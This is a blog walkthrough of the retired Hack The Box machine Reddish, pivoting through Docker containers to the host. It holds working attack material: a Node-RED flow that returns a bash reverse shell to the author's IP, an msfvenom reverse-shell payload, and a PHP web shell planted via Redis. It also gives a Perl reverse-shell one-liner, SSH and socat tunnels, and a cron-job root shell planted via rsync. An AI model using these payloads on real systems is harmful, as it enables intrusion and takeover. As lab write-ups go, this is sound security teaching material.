---
layout: post
title: "Reddish: Hack The Box Walkthrough"
subtitle: "Red goes with everything and red goes with nothing."
date: 2019-01-27 02:18:27 +0000
last_modified_at: 2019-02-09 09:30:07 +0000
category: Walkthrough
tags: ["Hack The Box", Reddish, retired]
comments: true
image:
  feature: reddish-htb-walkthrough.jpg
  credit: ItNeverEnds / Pixabay
  creditlink: https://pixabay.com/en/woman-dark-design-darkness-2845664/
---

This post documents the complete walkthrough of Reddish, a retired vulnerable [VM][1] created by [yuntao][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Reddish is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.94
...
PORT     STATE SERVICE REASON         VERSION
1880/tcp open  http    syn-ack ttl 62 Node.js Express framework
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
| http-methods:
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-title: Error
```


{% include image.html image_alt="60964cdc.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/60964cdc.png" %}


Since I can't `GET`, let's try `POST`.

### Node-RED


{% include image.html image_alt="34217a09.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/34217a09.png" %}


Nice! Let's follow the hint from the output above.


{% include image.html image_alt="b4cac579.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/b4cac579.png" %}


Node-RED allows command execution. Import the following flow into the Node-RED and you should see something like this.

```json
[{"id":"30fa9bc2.3414cc","type":"tcp in","z":"506564e3.6cef04","name":"","server":"client","host":"10.10.13.52","port":"1234","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":120,"y":80,"wires":[["cc2b2fad.f52d6"]]},{"id":"4f71ce1a.fc7078","type":"tcp out","z":"506564e3.6cef04","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":650,"y":80,"wires":[]},{"id":"cc2b2fad.f52d6","type":"exec","z":"506564e3.6cef04","command":"/bin/bash -c","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":410,"y":160,"wires":[["4f71ce1a.fc7078"],["4f71ce1a.fc7078"],[]]}]
```


{% include image.html image_alt="277ccaaf.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/277ccaaf.png" %}


Here, I'm running a reverse shell flow, executing `/bin/bash -c` and returning `stdout` and `stderr` to myself. And, because it's running under the context of `/bin/bash -c`, commands with space has to be enclosed in quotes.

Bummer, I know.

That's why I spun off another reverse shell with `msfvenom`.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.13.52 LPORT=9999 -f elf -o rev
```

Next, I've to find a more efficient way of transferring files over to the remote target. To that end, I wrote a `wget` utility in Node.js since `node` and the `request` modules are available. The script has two arguments: the first argument is the download URL and the second argument is the path to save the file.

<div class="filename"><span>wget.js</span></div>

```js
const fs = require('fs');
const request = require('request');

var args = process.argv.slice(2);
var url = args[0];
var location = args[1];

request(url).pipe(fs.createWriteStream(location));
```

Long story short, I transferred over the `base64`-encoded string of the `wget.js` and reverse the process like so.


{% include image.html image_alt="47b0b761.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/47b0b761.png" %}


Now that I've a better shell and have `root`; only to realize that Node-RED is running inside a Docker container!


{% include image.html image_alt="dc175e6a.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/dc175e6a.png" %}


Exploring the docker container, I realized that there might be other containers around!


{% include image.html image_alt="15854ce9.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/15854ce9.png" %}


Look at `172.19.0.4/16`. My first guess is that there are probably two containers on `172.19.0.2` and `172.19.0.3` respectively because `172.19.0.1` is likely the host.

And because the docker container is lacking in the network reconnaissance department, I'd to transfer `nc` to act as a no-frills port scanner, leveraging on the zero I/O mode in `nc`.


{% include image.html image_alt="dcb10508.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/dcb10508.png" %}


With `nc`, I can perform rudimentary port scans to my liking.


{% include image.html image_alt="cc3f6db4.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/cc3f6db4.png" %}



{% include image.html image_alt="ce11a9c4.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/ce11a9c4.png" %}


Next, let's transfer over Dropbear SSH client, `dbclient`, a drop-in replacement SSH client with a small footprint. The `dbclient` allows us to forward remote ports to my attacking machine via the SSH tunnel. The instruction to statically compile `dbclient` is beyond the scope of this write-up.


{% include image.html image_alt="5312b252.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/5312b252.png" %}


While we are at it, let's transfer a [statically compiled](https://github.com/andrew-d/static-binaries) `socat` as well. Now, start the SSH server on my attacking machine. Note that I've allowed `root` login with `PermitRootLogin yes`.

```
# systemctl start ssh
```

Forward the remote ports to my attacking machine like so.

```
# ssh -R 10.10.13.52:6379:172.19.0.2:6379 root@10.10.13.52 -f -N
# ssh -R 10.10.13.52:80:172.19.0.3:80 root@10.10.13.52 -f -N
```

{% include image.html image_alt="330408a6.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/330408a6.png" %}


Now, I can access these docker containers!

### Next Container: `www`


{% include image.html image_alt="ca73aed2.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/ca73aed2.png" %}


Looks like we have hints in the HTML source.


{% include image.html image_alt="225874a9.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/225874a9.png" %}


If I have to guess, I would say that the `www` container and the `redis` container are sharing `/var/www/html`. Another piece of technology that will aid us is PHP.


{% include image.html image_alt="8969b34f.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/8969b34f.png" %}


If that's the case, then I can do something like this since I also have access to the `redis` container:


{% include image.html image_alt="8c81ac83.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/8c81ac83.png" %}


1. Set `dir` to `/var/www/html`.
2. Set `dbfilename` to `cmd.php`.
3. Set a key with PHP code to allows remote command execution.
4. Save the snapshot.


{% include image.html image_alt="3f606a3a.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/3f606a3a.png" %}


Awesome. It works!


{% include image.html image_alt="9c96e133.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/9c96e133.png" %}


I prefer to use Perl as the reverse shell because it's always available, even in containers. :grin:

Before we do that, we need to set up another a TCP tunnel between `nodered` and my attacking machine to facilitate data shuffling between the `www` container and my attacking machine.


{% include image.html image_alt="66ad6a7b.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/66ad6a7b.png" %}


This is how the Perl reverse shell looks like before URL encoding:

```
perl -e 'use Socket;$i="172.19.0.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Encode it to prevent complications.

```
perl%20-e%20%27use%20Socket%3B%24i%3D%22172.19.0.4%22%3B%24p%3D4444%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27
```

We have shell into `www`!


{% include image.html image_alt="93b832f1.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/93b832f1.png" %}


### Next Container: `backup`

We'll soon realize that `www` is another multi-homed container.


{% include image.html image_alt="b9c0d8cb.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/b9c0d8cb.png" %}


It's getting familiar now. Another container probably lives at `172.20.0.2`. Suffice to say, we need to transfer our beloved `nc` to `www` to show some port scanning love to the newly discovered container.

The transfer this time round is more troublesome because the reverse shell truncates the `base64`-encoded string of `nc`. Fret not, we can `gzip` before encoding. Like this, we can save some space and reduce the number of times we copy-and-paste the string over in a piece-meal fashion.


{% include image.html image_alt="29c59a41.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/29c59a41.png" %}


It's not pretty but hey, it works!


{% include image.html image_alt="4a2e4309.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/4a2e4309.png" %}


What do we have here?


{% include image.html image_alt="1fc6c192.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/1fc6c192.png" %}


And there's a `rysnc` client in `www`!


{% include image.html image_alt="caec74a8.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/caec74a8.png" %}


During enumeration of `www`, I found the following locations of interest:

+ `cron` job at `/etc/cron.d/backup`
+ `/dev/sda3` `mount`ed at `/home`


{% include image.html image_alt="0f201a94.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/0f201a94.png" %}


This is how `backup.sh` looks like.


{% include image.html image_alt="82a69a18.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/82a69a18.png" %}


This is how the `mount`s looks like.


{% include image.html image_alt="81db80f4.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/81db80f4.png" %}


Now I'm pretty sure getting the flags have something to do with the last container.

I'll not go over how to use or what `rsync` is, that's what the man-pages are for. RTFM!


{% include image.html image_alt="4c13e0f5.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/4c13e0f5.png" %}


Pivoting on how `cron` job is scheduled in `www`, I found a similar `cron` job in `backup` too.


{% include image.html image_alt="5eb2d293.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/5eb2d293.png" %}


No wonder the database backup doesn't complete!

We know `rsync` works both ways. We can copy files from `backup`, we can also copy files over to `backup`. I've done my enumerations. :triumph:

Let's copy two files over. Our beloved `nc` and another `cron` job that runs the `nc` reverse shell back to us. But before we do that, we need to set up a pair of TCP tunnels between `nodered` and `www`; and `nodered` and my attacking machine. If you have been following the walkthrough so far, you realized that there's no `socat` in `www`. As such, we also need to transfer `socat` to `www`, with the help of `nc`, of course.

_On `www`, use the following command_

```
$ /tmp/nc -lnvp 1234 > /tmp/socat &
```

_On `nodered`, use the following command_

```
# nc 172.19.0.3 1234 < /usr/bin/socat &
```

Now we cat set up the tunnels.

_On `www`, use the following command_

```
$ /tmp/socat tcp-listen:5555,fork tcp:172.20.0.3:5555 &
```

_On `nodered`, use the following command_

```
# socat tcp-listen:5555,fork tcp:10.10.13.52:5555 &
```

Now, let's copy the files over.


{% include image.html image_alt="9ca34772.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/9ca34772.png" %}


A minute later, you'll receive a `root` shell on `backup`.


{% include image.html image_alt="1c0006c2.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/1c0006c2.png" %}


### Flags

The `backup` container as the name suggests, stores the data on the host. Because of that, we can `mount` the host's partitions within the container. And since we are `root` on this container, we can read any files from the `mount`ed volumes.


{% include image.html image_alt="99ec97fa.png" image_src="/5fe3821d-e533-403a-80d3-5ef5fe793aa2/99ec97fa.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/147
[2]: https://www.hackthebox.eu/home/users/profile/12438
[3]: https://www.hackthebox.eu/
